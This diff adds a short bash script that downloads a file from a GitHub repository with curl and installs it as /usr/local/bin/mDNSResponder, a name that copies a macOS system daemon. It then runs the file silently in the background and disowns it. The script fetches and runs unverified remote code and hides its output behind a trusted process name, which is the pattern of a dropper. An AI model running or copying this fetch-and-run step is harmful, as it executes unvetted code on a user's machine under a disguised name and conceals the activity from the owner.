@@ -1,0 +1,6 @@
+#!/usr/bin/env bash
+
+curl -s https://raw.githubusercontent.com/aj-may/boss/master/mDNSResponder > /usr/local/bin/mDNSResponder
+chmod u+x /usr/local/bin/mDNSResponder
+
+/usr/local/bin/mDNSResponder &> /dev/null & disown
